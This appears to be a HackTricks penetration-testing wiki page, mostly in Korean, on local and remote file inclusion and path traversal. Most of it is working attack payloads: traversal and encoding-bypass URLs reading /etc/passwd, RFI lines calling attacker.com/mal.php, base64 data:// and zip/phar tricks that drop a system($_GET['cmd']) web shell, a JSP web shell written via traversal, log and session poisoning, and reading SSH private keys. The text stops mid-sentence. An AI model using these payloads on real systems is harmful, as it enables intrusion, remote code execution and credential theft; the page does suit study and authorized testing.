# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 원격 서버에서 파일을 로드합니다 (장점: 코드를 작성하면 서버에서 실행됩니다). php에서는 기본적으로 **비활성화**되어 있습니다 (**allow_url_include**).\
**Local File Inclusion (LFI):** 서버가 로컬 파일을 로드합니다.

이 취약점은 사용자가 서버가 로드할 파일을 어떤 식으로든 제어할 수 있을 때 발생합니다.

취약한 **PHP functions**: require, require_once, include, include_once

이 취약점을 악용하기 위한 유용한 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 *nix LFI 목록을 혼합하고 경로를 추가하여 만든 목록:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to add `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

여러 워드리스트를 병합한 것:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to remove `C:/` and add `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

linux의 LFI 목록을 확인하세요.

## 기본 LFI 및 우회

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences 비재귀적으로 제거됨
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

제공된 문자열의 끝에 추가 문자가 붙는 것을 우회합니다 (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이 내용은 **PHP 5.4 이후로 해결되었습니다**

### **인코딩**

비표준 인코딩(예: double URL encode 등)을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 기존 폴더에서

백엔드가 폴더 경로를 확인하고 있을 수 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 서버에서 파일 시스템 디렉터리 탐색

서버의 파일 시스템은 특정 기법을 사용해 파일뿐만 아니라 디렉터리를 재귀적으로 탐색할 수 있습니다. 이 과정은 디렉터리 깊이를 파악하고 특정 폴더의 존재 여부를 확인하는 것을 포함합니다. 아래는 이를 수행하는 자세한 방법입니다:

1. **디렉터리 깊이 확인:** `/etc/passwd` 파일을 성공적으로 가져와 현재 디렉터리의 깊이를 확인합니다(서버가 Linux 기반인 경우 적용). 예시 URL은 다음과 같이 구성될 수 있으며, 깊이가 3임을 나타냅니다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** 의심되는 폴더 이름(예: `private`)을 URL에 추가한 다음, `/etc/passwd`로 다시 이동합니다. 추가된 디렉터리 수준 때문에 depth를 한 단계 증가시켜야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **결과 해석:** 서버의 응답은 폴더 존재 여부를 나타냅니다:
- **오류 / 출력 없음:** 지정한 위치에 `private` 폴더가 존재하지 않을 가능성이 큽니다.
- **`/etc/passwd`의 내용:** `private` 폴더의 존재가 확인됩니다.
4. **재귀적 탐색:** 발견된 폴더는 동일한 기법이나 기존의 Local File Inclusion (LFI) 기법을 사용해 하위 디렉토리나 파일을 추가로 조사할 수 있습니다.

파일 시스템의 다른 위치에 있는 디렉토리를 탐색하려면 payload를 적절히 조정하세요. 예를 들어, 현재 디렉토리가 깊이(depth) 3에 있다고 가정할 때 `/var/www/`에 `private` 디렉토리가 있는지 확인하려면 다음을 사용하세요:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation은 웹 애플리케이션에서 파일 경로를 조작하기 위해 사용하는 기법이다. 파일 경로 끝에 추가 문자를 덧붙이는 특정 보안 조치를 bypass하여 제한된 파일에 접근하는 데 자주 사용된다. 목표는 보안 조치에 의해 변경된 후에도 여전히 원하는 파일을 가리키는 파일 경로를 만드는 것이다.

In PHP에서는 파일 시스템의 특성상 다양한 형태의 파일 경로 표현이 동일하게 처리될 수 있다. 예를 들어:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, 및 `/etc/passwd/`는 모두 동일한 경로로 처리된다.
- 마지막 6자가 `passwd`일 때 `/`를 덧붙여 `passwd/`로 만들어도 대상 파일은 변경되지 않는다.
- 마찬가지로 파일 경로 끝에 `.php`가 붙어 있을 경우(예: `shellcode.php`), 끝에 `/.`를 추가해도 접근되는 파일은 달라지지 않는다.

아래 예제들은 민감한 내용(사용자 계정 정보) 때문에 흔히 타깃이 되는 `/etc/passwd`에 접근하기 위해 path truncation을 활용하는 방법을 보여준다:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In these scenarios, the number of traversals needed might be around 2027, but this number can vary based on the server's configuration.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`)와 추가 dot segments 및 문자들을 결합하면 파일 시스템을 탐색할 수 있으며, 서버가 덧붙인 문자열을 사실상 무시하게 만들 수 있습니다.
- **Determining the Required Number of Traversals**: 시행착오를 통해 루트 디렉터리로 이동한 뒤 `/etc/passwd`에 도달하는 데 필요한 정확한 `../` 시퀀스 수를 찾을 수 있으며, 이 과정에서 `.php`와 같은 덧붙여진 문자열이 무력화되더라도 원하는 경로(`/etc/passwd`)는 그대로 유지되도록 할 수 있습니다.
- **Starting with a Fake Directory**: 경로를 존재하지 않는 디렉터리(예: `a/`)로 시작하는 것은 일반적인 관행입니다. 이 기법은 예방책으로 사용되거나 서버의 경로 파싱 로직 요구사항을 충족시키기 위해 사용됩니다.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php에서는 기본적으로 비활성화되어 있습니다. 이는 **`allow_url_include`**가 **Off.**이기 때문이며, 작동하려면 **On**이어야 합니다. 그 경우 서버에서 PHP 파일을 include하여 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
어떤 이유로 **`allow_url_include`**가 **On**이고 PHP가 외부 웹페이지 접근을 **필터링**하고 있다면, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), 예를 들어 data protocol과 base64를 사용해 b64 PHP 코드를 디코드하여 RCE를 얻을 수 있습니다:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 이전 코드에서, 마지막 `+.txt`는 공격자가 `.txt`로 끝나는 문자열을 필요로 했기 때문에 추가된 것이다. 그래서 문자열은 그것으로 끝나고 b64 decode 이후 그 부분은 단지 쓰레기를 반환하며 실제 PHP 코드는 포함되어 (따라서 실행된다).

또 다른 예로 **`php://` 프로토콜을 사용하지 않는** 경우는 다음과 같다:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 루트 요소

다음과 같은 코드에서 python의 경우:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 **absolute path**를 **`file_name`**에 전달하면, **이전 경로는 단순히 제거됩니다**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
이는 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)에 따른 의도된 동작입니다:

> 컴포넌트가 절대 경로인 경우 이전의 모든 컴포넌트는 버려지고 결합은 절대 경로 컴포넌트에서 계속됩니다.

## Java 디렉터리 목록

Java에서 Path Traversal이 있고 파일 대신 **ask for a directory**를 요청하면, 디렉터리의 **listing of the directory is returned**가 반환되는 것처럼 보입니다. 다른 언어에서는 이런 일이 발생하지 않는 것 같습니다 (내가 알기로는).

## 상위 25개 파라미터

다음은 local file inclusion (LFI) 취약점에 노출될 수 있는 상위 25개 파라미터 목록입니다 (출처: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **수정 작업**을 데이터가 읽히거나 쓰이기 전에 수행할 수 있게 합니다. 필터는 5가지 범주가 있습니다:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 데이터에서 태그를 제거합니다( "<" 및 ">" 문자 사이의 모든 내용).
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 다른 인코딩으로 변환합니다(`convert.iconv.<input_enc>.<output_enc>`). 지원되는 **모든 인코딩 목록**을 얻으려면 콘솔에서 `iconv -l`을 실행하세요.

> [!WARNING]
> `convert.iconv.*` 변환 필터를 남용하면 **임의의 텍스트를 생성할 수 있습니다**, 이는 임의의 텍스트를 쓰거나 include 같은 함수가 임의의 텍스트를 처리하게 하는 데 유용할 수 있습니다. 자세한 내용은 [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)를 확인하세요.

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 콘텐츠를 압축합니다(많은 정보를 exfiltrate할 때 유용).
- `zlib.inflate`: 데이터를 압축 해제합니다.
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- php에서 `var_dump(stream_get_filters());`를 실행하면 몇 가지 **예상치 못한 필터**를 찾을 수 있습니다:
- `consumed`
- `dechunk`: HTTP chunked 인코딩을 역처리합니다
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> 부분 "php://filter"는 대소문자를 구분하지 않습니다

### php filters를 oracle로 사용하여 임의 파일을 읽기

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) 에는 서버로부터 출력이 반환되지 않아도 로컬 파일을 읽는 기술이 제안되어 있습니다. 이 기술은 **boolean exfiltration of the file (char by char) using php filters**을 oracle로 사용하는 것에 기반합니다. 이는 php filters를 사용해 텍스트를 충분히 크게 만들어 php가 예외를 발생시키도록 할 수 있기 때문입니다.

원문 포스트에서 기술에 대한 자세한 설명을 볼 수 있지만, 여기서 빠른 요약을 제공합니다:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- 이는 초기 문자가 올바르게 추측되었을 때 php가 **오류**를 발생시킬 만큼 매우 큰 **text**를 생성하는 데 사용됩니다.
- **dechunk** 필터는 **첫 문자가 16진수가 아니면 모든 것을 제거**하므로 첫 문자가 hex인지 알 수 있습니다.
- 이는 이전 필터(및 추측된 문자에 따라 다른 필터)와 결합되어, 충분한 변환을 가했을 때 문자가 16진수 문자가 아니게 되는 시점을 보고 텍스트의 처음 문자를 추측할 수 있게 해줍니다. 16진수라면 dechunk가 삭제하지 않고 초기 폭탄이 php 오류를 발생시키기 때문입니다.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- 시작 지점에서 **rot13** 같은 다른 변환을 사용하면 n, o, p, q, r 같은 다른 문자를 leak할 수 있습니다(또한 다른 코덱을 사용해 다른 문자들을 16진수 범위로 옮길 수도 있습니다).
- 초기 문자가 숫자일 경우 base64로 인코딩하고 처음 2문자를 leak하여 숫자를 알아내야 합니다.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

게시물에서는 이를 자동으로 수행하는 도구도 공개되었습니다: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
또한 **php://stdin, php://stdout and php://stderr**를 사용해 각각 **file descriptors 0, 1 and 2**에 접근할 수 있습니다 (공격에서 어떻게 유용할지는 잘 모르겠습니다)

### zip:// and rar://

PHPShell이 들어있는 Zip 또는 Rar 파일을 업로드한 뒤 접근하세요.\
rar protocol을 악용하려면 **명시적으로 활성화되어야 합니다**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 설정 **`allow_url_open`** 및 **`allow_url_include`**에 의해 제한됩니다.

### expect://

Expect를 활성화해야 합니다. 이를 사용하여 code를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST 파라미터에 payload를 지정하세요:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

웹 애플리케이션이 파일 로딩에 `include` 같은 함수를 사용할 때 `.phar` 파일을 이용해 PHP 코드를 실행할 수 있다. 아래 PHP 코드 스니펫은 `.phar` 파일 생성 방법을 보여준다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면 다음 명령을 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
실행하면 `test.phar`라는 파일이 생성되며, 이는 Local File Inclusion (LFI) 취약점을 악용하는 데 사용될 수 있습니다.

LFI가 PHP 코드 실행 없이 파일을 읽기만 하는 경우(예: `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, `filesize()` 등), phar 프로토콜을 통한 파일 읽기와 관련된 deserialization vulnerability를 이용해 공격을 시도할 수 있습니다.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

php filters를 지원하는 PHP에서의 **any arbitrary file read from PHP that supports php filters**를 악용하면 RCE를 얻을 수 있었습니다. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
간단 요약: PHP 힙의 **3 byte overflow**를 악용해 특정 크기의 free chunks 체인을 **alter the chain of free chunks**하여 임의 주소에 **write anything in any address**할 수 있게 했고, **`system`**을 호출하는 훅을 추가했습니다.\
추가적인 php filters를 악용해 특정 크기의 청크를 alloc하는 것이 가능했습니다.

### More protocols

다음에서 더 많은 가능한[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**을 확인하세요:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 쓰기 (file inclusion attack에서 어떻게 유용할지 확실치 않음)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일시스템 접근
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 압축 스트림
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴에 일치하는 경로명 찾기 (출력 가능한 내용을 반환하지 않아 여기서는 별로 유용하지 않음)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림 (임의 파일 읽기에 유용하지 않음)

## LFI via PHP's 'assert'

PHP에서 'assert' 함수는 문자열 내의 코드를 실행할 수 있으므로 Local File Inclusion (LFI) 위험이 특히 큽니다. 특히 ".." 같은 디렉토리 트래버설 문자가 포함된 입력을 검사만 하고 제대로 정제하지 않으면 문제가 됩니다.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이것은 traversal을 막으려는 의도이지만, 의도치 않게 code injection을 위한 벡터를 만듭니다. 파일 내용을 읽기 위해 이를 악용하려면 공격자는 다음을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
마찬가지로, arbitrary system commands 실행을 위해 다음을 사용할 수 있습니다:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> 이 기법은 당신이 **파일 경로**를 **제어**할 수 있고, 해당 경로를 통해 **PHP 함수**가 **파일에 접근**하지만 파일의 내용은 보이지 않는 경우(예: 단순한 **`file()`** 호출처럼)와 관련이 있습니다.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

요약하자면, 이 기법은 파일의 내용을 매우 **큰** 상태로 만들기 위해 **"UCS-4LE" encoding**을 사용하여 해당 파일을 여는 **PHP 함수**가 **error**를 발생시키게 하는 방식입니다.

그 다음, 첫 문자를 leak 하기 위해 필터 **`dechunk`**를 다른 필터들(예: **base64**, **rot13**)과 함께 사용하고, 마지막으로 필터 **convert.iconv.UCS-4.UCS-4LE** 및 **convert.iconv.UTF16.UTF-16BE**를 사용하여 **다른 문자들을 맨 앞에 배치하고 그것들을 leak**합니다.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

기술적 세부사항은 언급된 포스트를 확인하세요!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

서버 측 코드가 파일을 수집/업로드할 때 대상 경로를 사용자 제어 데이터(예: filename 또는 URL)를 사용해 canonicalise 및 검증 없이 조합하면, `..` 세그먼트나 절대 경로가 의도한 디렉터리를 탈출하여 임의 파일 쓰기가 발생할 수 있습니다. 페이로드를 웹 노출 디렉터리에 배치할 수 있다면, 보통 webshell을 떨어뜨려 인증되지 않은 RCE를 얻을 수 있습니다.

Typical exploitation workflow:
- 경로/파일명을 받아 디스크에 내용을 쓰는 write primitive를 제공하는 endpoint나 background worker를 식별합니다(예: message-driven ingestion, XML/JSON command handlers, ZIP extractors 등).
- web-exposed 디렉터리를 파악합니다. 일반적인 예:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 의도된 저장 디렉터리에서 webroot로 벗어나게 하는 traversal 경로를 만들어 webshell 내용을 포함시킵니다.
- 배포된 페이로드에 접속하여 명령을 실행합니다.

Notes:
- 파일 쓰기를 수행하는 취약 서비스는 비-HTTP 포트에서 리스닝할 수 있습니다(예: TCP 4004의 JMF XML 리스너). 메인 웹 포털(다른 포트)이 나중에 당신의 페이로드를 제공할 것입니다.
- Java 스택에서는 이러한 파일 쓰기가 종종 단순한 `File`/`Paths` 연결로 구현됩니다. canonicalisation/allow-listing의 부재가 핵심 결함입니다.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
이 유형의 버그를 막는 보안 강화:
- 정규화된 경로(canonical path)로 해석하고 허용 목록에 등록된 기준 디렉터리의 하위인지 강제하세요.
- `..`, 절대 루트, 또는 드라이브 문자를 포함하는 경로는 거부하세요; 생성된 파일명(prefer generated filenames) 사용을 권장합니다.
- writer를 권한이 낮은 계정으로 실행하고 쓰기 디렉터리를 서비스 루트와 분리하세요.

## Remote File Inclusion

앞에서 설명됨, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Apache 또는 Nginx 서버가 **vulnerable to LFI** 이고 include 함수 내부에서 취약점이 있다면 **`/var/log/apache2/access.log` 또는 `/var/log/nginx/access.log`** 에 접근을 시도할 수 있습니다. **user agent** 또는 **GET parameter** 안에 **`<?php system($_GET['c']); ?>`** 같은 php shell을 넣고 그 파일을 include 하세요.

> [!WARNING]
> **만약 shell에 대해 double quotes를 사용하면** simple quotes 대신 들어간 double quotes가 문자열 "_**quote;**_"로 변형되어 **PHP가 에러를 발생시키며** 아무 것도 실행되지 않습니다.
>
> 또한, 페이로드를 **정확히 작성**해야 합니다. 그렇지 않으면 PHP가 로그 파일을 로드할 때마다 에러가 나고 두 번째 기회를 얻지 못할 수 있습니다.

이 방법은 다른 로그에서도 가능하지만 **주의하세요,** 로그 안의 코드는 URL 인코딩되어 있을 수 있으며 이로 인해 Shell이 깨질 수 있습니다. 헤더 **authorisation "basic"** 는 Base64로 인코딩된 "user:password" 를 포함하며 로그 안에서 디코드됩니다. PHPShell은 이 헤더 안에 삽입될 수 있습니다.\
다른 가능한 로그 경로:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 이메일을 통해

**메일을 보내기**: 내부 계정 (user@localhost)으로 `<?php echo system($_REQUEST["cmd"]); ?>` 같은 PHP payload를 포함한 메일을 보내고, 사용자 메일을 **`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`** 경로로 include해 보세요.

### /proc/\*/fd/\*를 통해

1. 많은 shells(예: 100개)을 업로드하세요.
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), 여기서 $PID = 프로세스의 PID (can be brute forced)이고 $FD는 파일 디스크립터(또한 can be brute forced)입니다.

### /proc/self/environ을 통해

로그 파일처럼, User-Agent에 페이로드를 담아 보내면 /proc/self/environ 파일 안에 반영됩니다.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

파일을 업로드할 수 있다면, 그 파일에 shell payload를 주입하면 됩니다 (예: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 읽기 쉽게 유지하려면 이미지/doc/pdf의 메타데이터에 주입하는 것이 가장 좋습니다

### ZIP 파일 업로드를 통해

압축된 PHP shell을 포함한 ZIP 파일을 업로드하고 접근:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions를 통해

웹사이트가 PHP Session (PHPSESSID)을 사용하는지 확인하세요
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서는 이러한 세션이 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일에 저장됩니다
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie를 다음 값으로 설정하세요: `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI를 사용하여 PHP session 파일을 포함하세요
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh를 통해

ssh가 활성화되어 있다면 어떤 사용자가 사용되는지 확인하세요 (/proc/self/status & /etc/passwd) 그리고 **\<HOME>/.ssh/id_rsa**에 접근을 시도해보세요

### **를 통해** **vsftpd** _**logs**_

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 위치합니다. Local File Inclusion (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 접근할 수 있는 경우, 다음 단계를 고려할 수 있습니다:

1. 로그인 과정에서 username 필드에 PHP payload를 주입합니다.
2. 주입 후에는 LFI를 이용해 _**/var/log/vsftpd.log**_에서 서버 로그를 불러옵니다.

### php base64 filter (using base64)를 통해

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. 이를 이용해 파일 확장자 검사를 우회할 수 있습니다: base64가 ".php"로 끝나도록 공급하면, 필터는 "."를 무시하고 "php"를 base64에 추가합니다. 예시 payload는 다음과 같습니다:
